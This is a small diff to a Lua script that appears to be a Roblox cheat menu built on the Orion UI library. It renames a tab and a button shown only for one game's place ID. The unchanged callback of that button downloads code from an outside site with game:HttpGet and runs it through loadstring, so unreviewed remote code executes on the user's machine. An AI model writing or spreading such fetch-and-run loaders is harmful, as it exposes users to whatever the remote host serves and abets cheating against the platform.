@@ -83,17 +83,16 @@ end
 if game.placeId == 6884319169 then
 
 	local mic = Window:MakeTab({
-		Name = "Menu"
+		Name = "Mic Up"
 	})
 
 	mic:AddButton({
-		Name = "menu",
+		Name = "Menu",
 		Callback = function()
 			loadstring(game:HttpGet('https://whimper.xyz/kitty'))()
 		end
 	})
 
 end
-
 
 OrionLib:Init()
